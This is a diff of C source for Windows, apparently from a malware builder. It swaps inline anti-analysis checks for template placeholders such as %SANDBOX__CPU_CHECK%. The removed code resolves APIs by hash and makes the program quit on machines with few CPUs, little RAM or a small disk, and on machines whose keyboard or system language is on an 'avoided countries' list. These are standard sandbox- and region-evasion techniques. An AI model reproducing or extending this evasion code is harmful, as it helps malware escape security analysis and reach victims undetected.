@@ -32,17 +32,6 @@ const char* get_hostname(HMODULE hKernel32dll) {
     }
 }
 
-int get_disk_size(HMODULE hKernel32dll) {
-    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
-    int totalSizeGB = -11;
-    GetDiskFreeSpaceExFuncA _GetDiskFreeSpace = (GetDiskFreeSpaceExFuncA)CustomGetProcAdress(hKernel32dll, GET_DISK_FREE_SPACE_HASH);
-    if (_GetDiskFreeSpace("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
-        totalSizeGB = (int)((totalBytes.QuadPart + (1024LL * 1024 * 1024 / 2)) / (1024LL * 1024 * 1024));
-        // int freeSizeGB = (int)((totalFreeBytes.QuadPart + (1024LL * 1024 * 1024 / 2)) / (1024LL * 1024 * 1024));        
-    }
-    return totalSizeGB;
-}
-
 
 unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right) {
     unsigned int hash = 0;
@@ -123,49 +112,20 @@ bool is_valid_hostname(const char* hostname) {
 
 
 bool is_valid_language(HMODULE hKernel32) {
-    GetSystemDefaultLangIDFunc pGetSystemDefaultLangID = (GetSystemDefaultLangIDFunc)CustomGetProcAdress(hKernel32, GET_SYSTEM_DEFAULT_LANGID_HASH);
-    GetSystemDefaultLCIDFunc pGetSystemDefaultLCID = (GetSystemDefaultLCIDFunc)CustomGetProcAdress(hKernel32, GET_SYSTEM_DEFAULT_LCID_HASH);
 
-    uint16_t id_keyboard = LOWORD(GetKeyboardLayout(0));   // Keyboard layout
-    uint16_t id_system = pGetSystemDefaultLangID();         // System language
-    uint16_t id_regional = LOWORD(pGetSystemDefaultLCID()); // System regional settings
-    for (size_t i = 0; i < AVOIDED_COUNTRIES_SIZE; i++) {
-        if (AVOIDED_COUNTRIES[i] == id_keyboard || AVOIDED_COUNTRIES[i] == id_system || AVOIDED_COUNTRIES[i] == id_regional) {
-            return false;
-        }
-    }
+    %SANDBOX__COUNTRY_CHECK%
+
     return true;
 }
 
 
 bool is_valid_computer(HMODULE hKernel32) {
 
-    // CPU section
-    GetSystemInfoFunc pGetSystemInfo = (GetSystemInfoFunc)CustomGetProcAdress(hKernel32, GET_SYSTEM_INFO_HASH);
-    SYSTEM_INFO sysInfo;
-    pGetSystemInfo(&sysInfo);
-    
-    if (sysInfo.dwNumberOfProcessors <= %SANDBOX__CPU_COUNT%) {
-        return false;
-    }
-    
-    // RAM section
-    GlobalMemoryStatusExFunc pGlobalMemoryStatusEx = (GlobalMemoryStatusExFunc)CustomGetProcAdress(hKernel32, GLOBAL_MEMORY_STATUS_HASH);
-    MEMORYSTATUSEX memStatus;
-    memStatus.dwLength = sizeof(memStatus);
-    if (pGlobalMemoryStatusEx(&memStatus) && memStatus.ullTotalPhys / (1024 * 1024) < %SANDBOX__RAM_SIZE%) {
-        return false;
-    }
+    %SANDBOX__CPU_CHECK%
 
-    // // Disk section
-    // ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
-    // int totalSizeGB = -11;
-    // GetDiskFreeSpaceExFuncA _GetDiskFreeSpace = (GetDiskFreeSpaceExFuncA)CustomGetProcAdress(hKernel32dll, GET_DISK_FREE_SPACE_HASH);
-    // if (_GetDiskFreeSpace("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
-    //     totalSizeGB = (int)((totalBytes.QuadPart + (1024LL * 1024 * 1024 / 2)) / (1024LL * 1024 * 1024));
-    //     // int freeSizeGB = (int)((totalFreeBytes.QuadPart + (1024LL * 1024 * 1024 / 2)) / (1024LL * 1024 * 1024));        
-    // }
-    // return totalSizeGB;
+    %SANDBOX__RAM_CHECK%
+
+    %SANDBOX__DISK_CHECK%
 
     return true;
 }
